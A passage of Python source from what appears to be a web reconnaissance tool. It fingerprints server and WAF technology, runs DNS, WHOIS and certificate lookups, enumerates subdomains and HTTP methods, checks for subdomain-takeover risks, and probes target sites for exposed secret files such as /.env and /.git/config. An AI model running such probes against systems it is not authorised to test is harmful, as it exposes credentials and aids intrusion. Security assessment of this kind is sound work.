                # Certificate authority hints
                if 'cf-ray' in headers:
                    info['certificate_provider'] = 'Cloudflare'
                elif 'x-amz-cf-id' in headers:
                    info['certificate_provider'] = 'AWS'
            else:
                info['tls_enabled'] = False
                info['security_warning'] = '⚠️ Unencrypted HTTP connection'
            
            # Port Detection
            info['port'] = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)
            
            # Security Headers Analysis
            security_headers = {
                'content-security-policy': 'CSP Enabled',
                'x-content-type-options': 'MIME Sniffing Protection',
                'x-frame-options': 'Clickjacking Protection',
                'x-xss-protection': 'XSS Filter',
                'referrer-policy': 'Referrer Policy',
                'permissions-policy': 'Permissions Policy',
                'expect-ct': 'Certificate Transparency'
            }
            
            enabled_security = []
            missing_security = []
            
            for header, description in security_headers.items():
                if header in headers:
                    enabled_security.append(f"{description}: {headers[header][:50]}")
                else:
                    missing_security.append(description)
            
            info['security_headers_enabled'] = enabled_security if enabled_security else ['None']
            info['security_headers_missing'] = missing_security if missing_security else ['All Present']
            
            # Compression Detection
            encoding = headers.get('content-encoding', '')
            if encoding:
                info['compression'] = encoding
            
            # Cache Analysis
            cache_control = headers.get('cache-control', '')
            if cache_control:
                info['cache_policy'] = cache_control
                
        except Exception as e:
            self.config.logger.debug(f"Network analysis error: {e}")
        
        return info
    
    async def _perform_reconnaissance(self, url: str, content: str, headers: Dict) -> Dict:
        """Advanced reconnaissance and enumeration."""
        info = {}
        
        try:
            # Technology Stack Signature
            tech_stack = []
            
            # Check for common technology signatures
            tech_signatures = {
                'Cloudflare': 'cf-ray' in headers,
                'AWS': 'x-amz-' in str(headers),
                'Azure': 'x-ms-' in str(headers),
                'Google Cloud': 'x-goog-' in str(headers),
                'Akamai': 'x-akamai' in str(headers),
                'Fastly': 'x-served-by' in headers and 'fastly' in str(headers.get('x-served-by', '')).lower(),
                'Varnish': 'x-varnish' in headers or 'via' in headers and 'varnish' in str(headers.get('via', '')).lower(),
                'nginx': 'server' in headers and 'nginx' in headers['server'].lower(),
                'Apache': 'server' in headers and 'apache' in headers['server'].lower(),
            }
            
            for tech, present in tech_signatures.items():
                if present:
                    tech_stack.append(tech)
            
            info['technology_stack'] = tech_stack if tech_stack else ['Not Detected']
            
            # API Detection
            api_indicators = [
                '/api/', '/v1/', '/v2/', '/graphql', '/rest/',
                'application/json', 'api-key', 'x-api-', 'authorization: bearer'
            ]
            
            is_api = False
            for indicator in api_indicators:
                if indicator in url.lower() or indicator in str(headers).lower() or indicator in content[:2000].lower():
                    is_api = True
                    break
            
            info['api_endpoint'] = 'Yes' if is_api else 'No'
            
            # Content Type Analysis
            content_type = headers.get('content-type', '')
            if content_type:
                info['content_type'] = content_type.split(';')[0]
                
                if 'json' in content_type:
                    info['response_format'] = 'JSON'
                elif 'xml' in content_type:
                    info['response_format'] = 'XML'
                elif 'html' in content_type:
                    info['response_format'] = 'HTML'
                else:
                    info['response_format'] = content_type
            
            # Response Size
            info['content_length'] = headers.get('content-length', f'{len(content)} bytes (calculated)')
            
            # Server Location Hints from headers
            server_location_headers = [
                'x-served-by', 'x-cache', 'x-cache-hits',
                'x-timer', 'x-backend-server', 'x-host'
            ]
            
            location_hints = []
            for header in server_location_headers:
                if header in headers:
                    location_hints.append(f"{header}: {headers[header][:100]}")
            
            if location_hints:
                info['server_location_hints'] = location_hints
            
            # Web Application Firewall (WAF) Detection
            waf_indicators = {
                'Cloudflare': ['cf-ray', '__cfduid'],
                'AWS WAF': ['x-amzn-', 'x-amz-'],
                'Akamai': ['akamai'],
                'Imperva': ['incap_ses', 'visid_incap'],
                'Sucuri': ['x-sucuri-id'],
                'Wordfence': ['wordfence'],
                'ModSecurity': ['mod_security'],
                'F5 BIG-IP': ['bigip', 'f5'],
            }
            
            detected_waf = []
            for waf, indicators in waf_indicators.items():
                for indicator in indicators:
                    if any(indicator in str(v).lower() for v in headers.values()) or any(indicator in k.lower() for k in headers.keys()):
                        detected_waf.append(waf)
                        break
            
            info['waf_detected'] = detected_waf if detected_waf else ['None Detected']
            
            # Cookie Analysis
            cookies = headers.get('set-cookie', '')
            if cookies:
                cookie_list = cookies.split(',') if ',' in cookies else [cookies]
                cookie_info = []
                
                for cookie in cookie_list[:5]:  # Analyze first 5 cookies
                    cookie_name = cookie.split('=')[0].strip()
                    
                    flags = []
                    if 'secure' in cookie.lower():
                        flags.append('Secure')
                    if 'httponly' in cookie.lower():
                        flags.append('HttpOnly')
                    if 'samesite' in cookie.lower():
                        flags.append('SameSite')
                    
                    cookie_info.append(f"{cookie_name}: {', '.join(flags) if flags else 'No security flags'}")
                
                info['cookie_analysis'] = cookie_info
            
            # Rate Limiting Detection
            rate_limit_headers = ['x-ratelimit-limit', 'x-rate-limit-limit', 'ratelimit-limit']
            for header in rate_limit_headers:
                if header in headers:
                    info['rate_limiting'] = f"Enabled: {headers[header]}"
                    break
            
            if 'rate_limiting' not in info:
                info['rate_limiting'] = 'Not Detected'
                
        except Exception as e:
            self.config.logger.debug(f"Reconnaissance error: {e}")
        
        return info

    async def get_site_info(self, url: str) -> Dict:
        """Enhanced comprehensive site reconnaissance and technical analysis."""
        info = {'url': url}
        
        try:
            result = await self.session.get(url)
            if result[0] is None:
                return info
                
            status, headers, content, final_url = result
            
            # 🖥️ Server & Hosting Information
            server_info = await self._analyze_server_hosting(url, headers, content)
            info.update(server_info)
            
            # 🧱 Backend Stack Detection
            backend_info = await self._analyze_backend_stack(headers, content, url)
            info.update(backend_info)
            
            # 🎨 Frontend Stack Analysis
            frontend_info = await self._analyze_frontend_stack(content, headers)
            info.update(frontend_info)
            
            # 🌐 Network & Protocol Analysis
            network_info = await self._analyze_network_protocol(url, headers)
            info.update(network_info)
            
            # 🕵️ Reconnaissance & Enumeration
            recon_info = await self._perform_reconnaissance(url, content, headers)
            info.update(recon_info)
            
        except Exception as e:
            self.config.logger.debug(f"Error gathering site info: {e}")
        
        return info

    async def perform_advanced_reconnaissance(self, url: str) -> Dict:
        """
        ADVANCED RECONNAISSANCE - 50+ Technical Details with Modern Libraries
        Comprehensive OSINT intelligence gathering
        """
        recon_data = {
            'whois': {},
            'dns': {},
            'ip_intelligence': {},
            'ssl_certificate': {},
            'technologies': {},
            'domain_info': {},
            'subdomains': [],
            'dns_records': {},
            'advanced_analysis': {
                'security_headers': {},
                'cookie_security': {},
                'cors_config': {},
                'http_methods': [],
                'open_ports': [],
                'sensitive_files': {},
                'robots_sitemap': {},
                'analytics_ids': {},
                'load_balancer': {},
                'os_fingerprint': {},
                'jarm_fingerprint': '',
                'waf_detection': {},
                'geolocation': {},
                'spf_dmarc': {},
                'saas_verification': {},
                'subdomain_takeover': [],
                'http_response_analysis': {},
                'tls_cipher_analysis': {},
                'cdn_detection': {},
                'cloud_provider': {},
                'api_endpoints': [],
                'email_security': {},
                'http_fingerprint': {},
                'server_tokens': {},
                'redirect_chain': [],
                'resource_hints': {},
                'csp_analysis': {},
                'certificate_chain': [],
                'http2_support': False,
                'websocket_support': False,
                'compression_methods': [],
                'cache_config': {},
                'timing_analysis': {}
            }
        }
        
        try:
            parsed = urlparse(url)
            domain = parsed.netloc
            
            # 1. WHOIS Lookup
            if WHOIS_AVAILABLE:
                try:
                    whois_data = whois.whois(domain)
                    recon_data['whois'] = {
                        'domain_name': whois_data.domain_name if hasattr(whois_data, 'domain_name') else 'Unknown',
                        'registrar': whois_data.registrar if hasattr(whois_data, 'registrar') else 'Unknown',
                        'creation_date': str(whois_data.creation_date) if hasattr(whois_data, 'creation_date') else 'Unknown',
                        'expiration_date': str(whois_data.expiration_date) if hasattr(whois_data, 'expiration_date') else 'Unknown',
                        'updated_date': str(whois_data.updated_date) if hasattr(whois_data, 'updated_date') else 'Unknown',
                        'name_servers': whois_data.name_servers if hasattr(whois_data, 'name_servers') else [],
                        'status': whois_data.status if hasattr(whois_data, 'status') else 'Unknown',
                        'emails': whois_data.emails if hasattr(whois_data, 'emails') else [],
                        'org': whois_data.org if hasattr(whois_data, 'org') else 'Unknown',
                        'country': whois_data.country if hasattr(whois_data, 'country') else 'Unknown'
                    }
                except Exception as e:
                    recon_data['whois']['error'] = str(e)
            else:
                recon_data['whois']['error'] = 'python-whois not installed'
            
            # 2. DNS Analysis
            if DNS_AVAILABLE:
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.timeout = 3
                    resolver.lifetime = 3
                    
                    # A Records (IPv4)
                    try:
                        a_records = resolver.resolve(domain, 'A')
                        recon_data['dns_records']['A'] = [str(r) for r in a_records]
                    except:
                        recon_data['dns_records']['A'] = []
                    
                    # AAAA Records (IPv6)
                    try:
                        aaaa_records = resolver.resolve(domain, 'AAAA')
                        recon_data['dns_records']['AAAA'] = [str(r) for r in aaaa_records]
                    except:
                        recon_data['dns_records']['AAAA'] = []
                    
                    # MX Records (Mail)
                    try:
                        mx_records = resolver.resolve(domain, 'MX')
                        recon_data['dns_records']['MX'] = [f"{r.preference} {r.exchange}" for r in mx_records]
                    except:
                        recon_data['dns_records']['MX'] = []
                    
                    # NS Records (Name Servers)
                    try:
                        ns_records = resolver.resolve(domain, 'NS')
                        recon_data['dns_records']['NS'] = [str(r) for r in ns_records]
                    except:
                        recon_data['dns_records']['NS'] = []
                    
                    # TXT Records
                    try:
                        txt_records = resolver.resolve(domain, 'TXT')
                        recon_data['dns_records']['TXT'] = [str(r) for r in txt_records]
                    except:
                        recon_data['dns_records']['TXT'] = []
                    
                    # CNAME Records
                    try:
                        cname_records = resolver.resolve(domain, 'CNAME')
                        recon_data['dns_records']['CNAME'] = [str(r) for r in cname_records]
                    except:
                        recon_data['dns_records']['CNAME'] = []
                    
                    # Reverse DNS (PTR)
                    if recon_data['dns_records'].get('A'):
                        try:
                            ip = recon_data['dns_records']['A'][0]
                            rev_name = dns.reversename.from_address(ip)
                            ptr_records = resolver.resolve(rev_name, 'PTR')
                            recon_data['dns_records']['PTR'] = [str(r) for r in ptr_records]
                        except:
                            recon_data['dns_records']['PTR'] = []
                    
                    recon_data['dns']['records_found'] = sum(len(v) if isinstance(v, list) else 0 for v in recon_data['dns_records'].values())
                    recon_data['dns']['status'] = 'Success'
                    
                except Exception as e:
                    recon_data['dns']['error'] = str(e)
            else:
                recon_data['dns']['error'] = 'dnspython not installed'
            
            # 3. IP Intelligence (WHOIS for IP) - IMPROVED WITH FALLBACKS
            ip_address = None
            
            # Try multiple methods to get IP address
            if recon_data['dns_records'].get('A'):
                ip_address = recon_data['dns_records']['A'][0]
            else:
                # Fallback: direct socket resolution
                try:
                    import socket
                    ip_address = socket.gethostbyname(domain)
                    if not recon_data['dns_records'].get('A'):
                        recon_data['dns_records']['A'] = [ip_address]
                except:
                    pass
            
            if ip_address and IPWHOIS_AVAILABLE:
                try:
                    obj = IPWhois(ip_address)
                    results = obj.lookup_rdap(depth=1, retry_count=2)
                    
                    network = results.get('network', {})
                    asn_registry = results.get('asn_registry', '')
                    
                    recon_data['ip_intelligence'] = {
                        'ip': ip_address,
                        'asn': results.get('asn', 'Unknown'),
                        'asn_description': results.get('asn_description', 'Unknown'),
                        'asn_country': results.get('asn_country_code', 'Unknown'),
                        'network_name': network.get('name', 'Unknown'),
                        'network_range': network.get('cidr', 'Unknown'),
                        'network_type': network.get('type', 'Unknown'),
                        'isp': network.get('name', results.get('asn_description', 'Unknown')),
                        'registry': asn_registry if asn_registry else 'Unknown',
                        'abuse_email': network.get('abuse_emails', ['Unknown'])[0] if network.get('abuse_emails') else 'Unknown'
                    }
                except Exception as e:
                    # Fallback: basic IP info
                    recon_data['ip_intelligence'] = {
                        'ip': ip_address,
                        'asn': 'Lookup failed',
                        'asn_description': str(e)[:50],
                        'asn_country': 'Unknown',
                        'isp': 'Lookup failed'
                    }
            elif ip_address:
                recon_data['ip_intelligence'] = {
                    'ip': ip_address,
                    'error': 'ipwhois not installed'
                }
            else:
                recon_data['ip_intelligence'] = {
                    'error': 'Could not resolve IP address'
                }
            
            # 4. SSL/TLS Certificate Analysis - IMPROVED with better parsing
            if parsed.scheme == 'https':
                cert_data = {}
                try:
                    import socket
                    import ssl as ssl_lib
                    from datetime import datetime
                    
                    port = parsed.port if parsed.port else 443
                    context = ssl_lib.create_default_context()
                    
                    # Connect and get certificate
                    with socket.create_connection((domain, port), timeout=8) as sock:
                        with context.wrap_socket(sock, server_hostname=domain) as ssock:
                            # Get cert in both formats
                            cert_dict = ssock.getpeercert()
                            cert_der = ssock.getpeercert(binary_form=True)
                            
                            # METHOD 1: Parse with cryptography library (preferred)
                            if SSL_ANALYSIS_AVAILABLE and cert_der:
                                try:
                                    cert = x509.load_der_x509_certificate(cert_der, default_backend())
                                    
                                    # Extract issuer - try multiple methods
                                    issuer_str = cert.issuer.rfc4514_string()
                                    # Parse CN from issuer
                                    issuer_cn = 'Unknown'
                                    for attr in cert.issuer:
                                        if attr.oid._name == 'commonName':
                                            issuer_cn = attr.value
                                            break
                                    
                                    # Get SAN
                                    san_list = []
                                    try:
                                        san_ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                                        san_list = [str(name.value) for name in san_ext.value]
                                    except:
                                        pass
                                    
                                    cert_data = {
                                        'subject': cert.subject.rfc4514_string(),
                                        'issuer': issuer_str,
                                        'issuer_cn': issuer_cn,
                                        'version': cert.version.name,
                                        'serial_number': str(cert.serial_number),
                                        'not_before': str(cert.not_valid_before),
                                        'not_after': str(cert.not_valid_after),
                                        'signature_algorithm': cert.signature_algorithm_oid._name,
                                        'public_key_algorithm': cert.public_key().__class__.__name__,
                                        'san': san_list,
                                        'is_expired': cert.not_valid_after < datetime.now(),
                                        'days_until_expiry': (cert.not_valid_after - datetime.now()).days,
                                        'key_size': cert.public_key().key_size if hasattr(cert.public_key(), 'key_size') else 0
                                    }
                                except Exception as e:
                                    # Fall through to METHOD 2
                                    pass
                            
                            # METHOD 2: Fallback to basic cert dict parsing
                            if not cert_data and cert_dict:
                                try:
                                    # Extract issuer from dict
                                    issuer = dict(cert_dict.get('issuer', [{}])[0])
                                    issuer_cn = issuer.get('commonName', issuer.get('organizationName', 'Unknown'))
                                    
                                    # Parse dates
                                    not_before = cert_dict.get('notBefore', '')
                                    not_after = cert_dict.get('notAfter', '')
                                    
                                    # Calculate expiry
                                    days_left = 0
                                    is_expired = False
                                    try:
                                        from datetime import datetime
                                        # Parse SSL date format: 'Jan  1 00:00:00 2025 GMT'
                                        expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                                        days_left = (expiry_date - datetime.now()).days
                                        is_expired = days_left < 0
                                    except:
                                        pass
                                    
                                    # Get SAN
                                    san_list = []
                                    if 'subjectAltName' in cert_dict:
                                        san_list = [name[1] for name in cert_dict['subjectAltName']]
                                    
                                    cert_data = {
                                        'subject': str(cert_dict.get('subject', 'Unknown')),
                                        'issuer': str(cert_dict.get('issuer', 'Unknown')),
                                        'issuer_cn': issuer_cn,
                                        'version': cert_dict.get('version', 'Unknown'),
                                        'serial_number': cert_dict.get('serialNumber', 'Unknown'),
                                        'not_before': not_before,
                                        'not_after': not_after,
                                        'san': san_list,
                                        'is_expired': is_expired,
                                        'days_until_expiry': days_left,
                                        'signature_algorithm': 'Unknown',
                                        'key_size': 0
                                    }
                                except Exception as e:
                                    cert_data = {'error': f'Parsing failed: {str(e)[:50]}'}
                            
                            recon_data['ssl_certificate'] = cert_data if cert_data else {'error': 'Could not parse certificate'}
                            
                except Exception as e:
                    recon_data['ssl_certificate'] = {'error': f'Connection failed: {str(e)[:100]}'}
            else:
                recon_data['ssl_certificate'] = {'error': 'Not HTTPS'}
            
            # 5. Technology Detection - IMPROVED WITH HEADER ANALYSIS
            tech_detected = {
                'web_servers': [],
                'programming_languages': [],
                'web_frameworks': [],
                'javascript_frameworks': [],
                'cms': [],
                'analytics': [],
                'cdn': [],
                'ssl_certificates': [],
                'advertising': [],
                'widgets': []
            }
            
            # Try builtwith first
            if BUILTWITH_AVAILABLE:
                try:
                    tech_data = builtwith.parse(url)
                    for key in tech_detected.keys():
                        builtwith_key = key.replace('_', '-')
                        if tech_data.get(builtwith_key):
                            tech_detected[key] = tech_data.get(builtwith_key, [])
                except Exception as e:
                    pass
            
            # FALLBACK: Manual header/content analysis
            try:
                result = await self.session.get(url)
                if result[0] is not None:
                    status, headers, content, _ = result
                    
                    # Web Server detection from Server header
                    server_header = headers.get('Server', headers.get('server', ''))
                    if server_header and not tech_detected['web_servers']:
                        tech_detected['web_servers'] = [server_header]
                    
                    # Language detection from X-Powered-By and content
                    powered_by = headers.get('X-Powered-By', headers.get('x-powered-by', ''))
                    if powered_by and not tech_detected['programming_languages']:
                        powered_by_lower = powered_by.lower()
                        if 'php' in powered_by_lower:
                            tech_detected['programming_languages'].append('PHP')
                        elif 'asp.net' in powered_by_lower:
                            tech_detected['programming_languages'].append('ASP.NET')
                        elif 'express' in powered_by_lower:
                            tech_detected['programming_languages'].append('Node.js')
                    
                    # Server header detection
                    server = headers.get('Server', headers.get('server', '')).lower()
                    if server and not tech_detected['programming_languages']:
                        if 'php' in server:
                            tech_detected['programming_languages'].append('PHP')
                        elif 'tomcat' in server or 'servlet' in server:
                            tech_detected['programming_languages'].append('Java')
                    
                    # Detect from content
                    if content:
                        content_lower = content.lower()
                        
                        # CMS detection
                        if not tech_detected['cms']:
                            if 'wp-content' in content_lower or 'wordpress' in content_lower:
                                tech_detected['cms'].append('WordPress')
                            elif 'joomla' in content_lower:
                                tech_detected['cms'].append('Joomla')
                            elif 'drupal' in content_lower:
                                tech_detected['cms'].append('Drupal')
                            elif 'shopify' in content_lower:
                                tech_detected['cms'].append('Shopify')
                        
                        # Framework detection
                        if not tech_detected['javascript_frameworks']:
                            if 'react' in content_lower or '_app' in content_lower:
                                tech_detected['javascript_frameworks'].append('React')
                            elif 'angular' in content_lower or 'ng-' in content_lower:
                                tech_detected['javascript_frameworks'].append('Angular')
                            elif 'vue' in content_lower or '__vue__' in content_lower:
                                tech_detected['javascript_frameworks'].append('Vue.js')
                        
                        # Web framework detection
                        if not tech_detected['web_frameworks']:
                            if 'laravel' in content_lower:
                                tech_detected['web_frameworks'].append('Laravel')
                            elif 'django' in content_lower:
                                tech_detected['web_frameworks'].append('Django')
                            elif 'flask' in content_lower:
                                tech_detected['web_frameworks'].append('Flask')
                            elif 'express' in content_lower:
                                tech_detected['web_frameworks'].append('Express')
            except:
                pass
            
            recon_data['technologies'] = tech_detected
            
            # 6. Domain Parsing with tldextract
            if TLDEXTRACT_AVAILABLE:
                try:
                    ext = tldextract.extract(url)
                    recon_data['domain_info'] = {
                        'subdomain': ext.subdomain,
                        'domain': ext.domain,
                        'suffix': ext.suffix,
                        'registered_domain': ext.registered_domain,
                        'fqdn': ext.fqdn,
                        'is_private': ext.is_private
                    }
                except Exception as e:
                    recon_data['domain_info']['error'] = str(e)
            else:
                recon_data['domain_info']['error'] = 'tldextract not installed'
            
            # 7. Common Subdomain Enumeration
            if DNS_AVAILABLE:
                try:
                    common_subdomains = [
                        'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
                        'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'mobile', 'm', 'dev',
                        'staging', 'test', 'api', 'admin', 'blog', 'shop', 'vpn', 'git', 'mysql',
                        'sql', 'secure', 'email', 'cloud', 'cdn', 'static', 'assets', 'img', 'images'
                    ]
                    
                    found_subdomains = []
                    base_domain = domain.replace('www.', '')
                    
                    for sub in common_subdomains[:20]:  # Limit to 20 to avoid slowdown
                        test_domain = f"{sub}.{base_domain}"
                        try:
                            resolver.resolve(test_domain, 'A', lifetime=2)
                            found_subdomains.append(test_domain)
                        except:
                            pass
                    
                    recon_data['subdomains'] = found_subdomains
                except Exception as e:
                    recon_data['subdomains'] = []
            
            # 8. ADVANCED ANALYSIS - Security Headers
            try:
                result = await self.session.get(url)
                if result[0] is not None:
                    status, headers, content, final_url = result
                    
                    # Security Headers Analysis
                    recon_data['advanced_analysis']['security_headers'] = {
                        'strict_transport_security': headers.get('Strict-Transport-Security', 'Missing'),
                        'content_security_policy': headers.get('Content-Security-Policy', 'Missing'),
                        'x_frame_options': headers.get('X-Frame-Options', 'Missing'),
                        'x_content_type_options': headers.get('X-Content-Type-Options', 'Missing'),
                        'x_xss_protection': headers.get('X-XSS-Protection', 'Missing'),
                        'referrer_policy': headers.get('Referrer-Policy', 'Missing'),
                        'permissions_policy': headers.get('Permissions-Policy', 'Missing')
                    }
                    
                    # CORS Configuration
                    recon_data['advanced_analysis']['cors_config'] = {
                        'access_control_allow_origin': headers.get('Access-Control-Allow-Origin', 'Not Set'),
                        'access_control_allow_credentials': headers.get('Access-Control-Allow-Credentials', 'Not Set'),
                        'access_control_allow_methods': headers.get('Access-Control-Allow-Methods', 'Not Set')
                    }
                    
                    # Load Balancer Detection
                    lb_indicators = {
                        'server': headers.get('Server', ''),
                        'via': headers.get('Via', ''),
                        'x_forwarded_for': headers.get('X-Forwarded-For', ''),
                        'x_loadbalancer': headers.get('X-LoadBalancer', ''),
                        'x_cache': headers.get('X-Cache', '')
                    }
                    lb_detected = any(v for v in lb_indicators.values() if v)
                    recon_data['advanced_analysis']['load_balancer'] = {
                        'detected': lb_detected,
                        'indicators': lb_indicators
                    }
                    
                    # WAF Detection
                    waf_headers = {
                        'x_waf': headers.get('X-WAF', ''),
                        'x_sucuri_id': headers.get('X-Sucuri-ID', ''),
                        'x_firewall': headers.get('X-Firewall', ''),
                        'cf_ray': headers.get('CF-RAY', ''),
                        'x_akamai': headers.get('X-Akamai-Request-ID', '')
                    }
                    waf_name = 'None'
                    if waf_headers['cf_ray']:
                        waf_name = 'Cloudflare'
                    elif waf_headers['x_sucuri_id']:
                        waf_name = 'Sucuri'
                    elif waf_headers['x_akamai']:
                        waf_name = 'Akamai'
                    recon_data['advanced_analysis']['waf_detection'] = {
                        'waf_name': waf_name,
                        'headers': waf_headers
                    }
                    
                    # Cookie Security Analysis
                    cookies_raw = headers.get('Set-Cookie', '')
                    if cookies_raw:
                        has_httponly = 'HttpOnly' in cookies_raw
                        has_secure = 'Secure' in cookies_raw
                        has_samesite = 'SameSite' in cookies_raw
                        recon_data['advanced_analysis']['cookie_security'] = {
                            'httponly': has_httponly,
                            'secure': has_secure,
                            'samesite': has_samesite,
                            'raw': cookies_raw[:200]  # Truncate for display
                        }
                    else:
                        recon_data['advanced_analysis']['cookie_security'] = {'status': 'No cookies set'}
                    
                    # Analytics & Tracker ID Extraction
                    analytics = {}
                    if content:
                        import re
                        # Google Analytics
                        ga_match = re.search(r'UA-\d{4,10}-\d{1,4}', content)
                        if ga_match:
                            analytics['google_analytics'] = ga_match.group(0)
                        
                        # Google Tag Manager
                        gtm_match = re.search(r'GTM-[A-Z0-9]{6,8}', content)
                        if gtm_match:
                            analytics['google_tag_manager'] = gtm_match.group(0)
                        
                        # Facebook Pixel
                        fb_match = re.search(r'fbq\(\'init\',\s*\'(\d+)\'', content)
                        if fb_match:
                            analytics['facebook_pixel'] = fb_match.group(1)
                        
                        # Google AdSense
                        adsense_match = re.search(r'ca-pub-\d{16}', content)
                        if adsense_match:
                            analytics['google_adsense'] = adsense_match.group(0)
                    
                    recon_data['advanced_analysis']['analytics_ids'] = analytics
            except Exception as e:
                self.config.logger.debug(f"Advanced analysis error: {e}")
            
            # 9. HTTP Methods Enumeration - IMPROVED
            detected_methods = []
            
            # Try OPTIONS first
            try:
                options_result = await self.session.options(url)
                if options_result[0] is not None:
                    _, options_headers, _, _ = options_result
                    allowed_methods = options_headers.get('Allow', options_headers.get('allow', ''))
                    if allowed_methods:
                        detected_methods = [m.strip().upper() for m in allowed_methods.split(',')]
            except:
                pass
            
            # FALLBACK: Test common methods directly
            if not detected_methods:
                test_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
                for method in test_methods[:4]:  # Test first 4 to avoid rate limits
                    try:
                        if method == 'GET':
                            result = await self.session.get(url)
                        elif method == 'POST':
                            result = await self.session.post(url)
                        elif method == 'HEAD':
                            result = await self.session.head(url)
                        else:
                            continue
                        
                        if result[0] is not None:
                            status = result[0]
                            if status != 405:  # Method not allowed
                                detected_methods.append(method)
                    except:
                        pass
            
            recon_data['advanced_analysis']['http_methods'] = detected_methods if detected_methods else ['GET']  # At minimum GET works
            
            # 10. Sensitive File Detection
            sensitive_files = [
                '/.env', '/.git/HEAD', '/.git/config', '/.DS_Store', 
                '/backup.sql', '/backup.zip', '/.env.local', '/.env.production',
                '/config.json', '/package.json', '/composer.json', '/.htaccess',
                '/web.config', '/phpinfo.php', '/info.php'
            ]
            
            found_files = {}
            for file_path in sensitive_files[:10]:  # Limit checks
                try:
                    test_url = urljoin(url, file_path)
                    result = await self.session.get(test_url)
                    if result[0] is not None:
                        status, _, content, _ = result
                        if status == 200 and content and len(content) > 0:
                            found_files[file_path] = f'EXPOSED ({len(content)} bytes)'
                except:
                    pass
            
            recon_data['advanced_analysis']['sensitive_files'] = found_files if found_files else {'status': 'None detected'}
            
            # 11. Robots.txt & Sitemap Analysis - IMPROVED
            robots_data = {}
            
            # Robots.txt - try multiple approaches
            robots_found = False
            for robots_path in ['/robots.txt', '/Robots.txt', '/ROBOTS.TXT']:
                try:
                    robots_url = urljoin(url, robots_path)
                    result = await self.session.get(robots_url)
                    if result[0] is not None:
                        status, _, content, _ = result
                        if status == 200 and content and len(content) > 10:
                            robots_data['robots_txt'] = 'Found'
                            robots_found = True
                            # Extract disallowed paths
                            try:
                                disallow_lines = [line.split(':', 1)[1].strip() for line in content.split('\n') if line.lower().startswith('disallow:')][:10]
                                robots_data['disallow_paths'] = disallow_lines if disallow_lines else []
                            except:
                                pass
                            break
                except:
                    pass
            
            if not robots_found:
                robots_data['robots_txt'] = 'Not found'
            
            # Sitemap - try multiple locations
            for sitemap_path in ['/sitemap.xml', '/sitemap_index.xml', '/sitemap1.xml']:
                try:
                    sitemap_url = urljoin(url, sitemap_path)
                    result = await self.session.get(sitemap_url)
                    if result[0] is not None:
                        status, _, content, _ = result
                        if status == 200 and content and 'xml' in content.lower():
                            robots_data['sitemap_xml'] = 'Found'
                            break
                except:
                    pass
            
            if 'sitemap_xml' not in robots_data:
                robots_data['sitemap_xml'] = 'Not found'
            
            # Security.txt - check both locations
            security_found = False
            for sec_path in ['/.well-known/security.txt', '/security.txt']:
                try:
                    security_txt_url = urljoin(url, sec_path)
                    result = await self.session.get(security_txt_url)
                    if result[0] is not None:
                        status, _, content, _ = result
                        if status == 200 and content:
                            robots_data['security_txt'] = 'Found'
                            security_found = True
                            # Parse security.txt fields
                            try:
                                security_fields = {}
                                for line in content.split('\n')[:20]:
                                    if ':' in line and not line.startswith('#'):
                                        parts = line.split(':', 1)
                                        if len(parts) == 2:
                                            security_fields[parts[0].strip()] = parts[1].strip()
                                robots_data['security_details'] = security_fields
                            except:
                                pass
                            break
                except:
                    pass
            
            if not security_found:
                robots_data['security_txt'] = 'Not found'
            
            recon_data['advanced_analysis']['robots_sitemap'] = robots_data
            
            # 12. SPF & DMARC Analysis - IMPROVED with direct DNS queries
            txt_records = recon_data['dns_records'].get('TXT', [])
            spf_dmarc = {'spf': 'Not configured', 'dmarc': 'Not configured'}
            
            # Check TXT records first
            for record in txt_records:
                record_str = str(record).strip('"')
                if record_str.startswith('v=spf1'):
                    spf_dmarc['spf'] = record_str
                elif record_str.startswith('v=DMARC1'):
                    spf_dmarc['dmarc'] = record_str
            
            # FALLBACK: Direct DNS query for DMARC if not found
            if spf_dmarc['dmarc'] == 'Not configured' and DNS_AVAILABLE:
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.timeout = 2
                    resolver.lifetime = 2
                    dmarc_domain = f"_dmarc.{domain}"
                    answers = resolver.resolve(dmarc_domain, 'TXT')
                    for rdata in answers:
                        txt = str(rdata).strip('"')
                        if txt.startswith('v=DMARC1'):
                            spf_dmarc['dmarc'] = txt
                            break
                except:
                    pass
            
            recon_data['advanced_analysis']['spf_dmarc'] = spf_dmarc
            
            # 13. SaaS Verification Tokens from TXT Records
            saas_tokens = {}
            for record in txt_records:
                record_str = str(record).strip('"')
                if 'google-site-verification' in record_str:
                    saas_tokens['Google'] = 'Verified'
                elif 'facebook-domain-verification' in record_str:
                    saas_tokens['Facebook'] = 'Verified'
                elif 'MS=' in record_str:
                    saas_tokens['Microsoft'] = 'Verified'
                elif 'atlassian-domain-verification' in record_str:
                    saas_tokens['Atlassian'] = 'Verified'
            
            recon_data['advanced_analysis']['saas_verification'] = saas_tokens if saas_tokens else {'status': 'No verification tokens found'}
            
            # 14. Subdomain Takeover Check via CNAME
            cname_records = recon_data['dns_records'].get('CNAME', [])
            takeover_risks = []
            vulnerable_patterns = [
                'github.io', 'herokuapp.com', 'wordpress.com', 'tumblr.com',
                'shopify.com', 'desk.com', 'zendesk.com', 'ghost.io',
                'bitbucket.io', 's3.amazonaws.com', 'azurewebsites.net'
            ]
            
            for cname in cname_records:
                cname_str = str(cname).lower()
                for pattern in vulnerable_patterns:
                    if pattern in cname_str:
                        takeover_risks.append(f'{cname} → Potential takeover risk ({pattern})')
            
            recon_data['advanced_analysis']['subdomain_takeover'] = takeover_risks if takeover_risks else ['No obvious risks detected']
            
            # 15. Geolocation via IP
            if recon_data['dns_records'].get('A'):
                try:
                    ip = recon_data['dns_records']['A'][0]
                    # Basic geolocation info from IP Intelligence if available
                    if recon_data.get('ip_intelligence', {}).get('asn_country'):
                        recon_data['advanced_analysis']['geolocation'] = {
                            'ip': ip,
                            'country': recon_data['ip_intelligence'].get('asn_country', 'Unknown')
                        }
                except:
                    pass
            
            # 16. OS Fingerprinting - ENHANCED
            os_hints = {'guess': 'Unknown', 'confidence': 'Low', 'indicators': []}
            try:
                result = await self.session.get(url)
                if result[0] is not None:
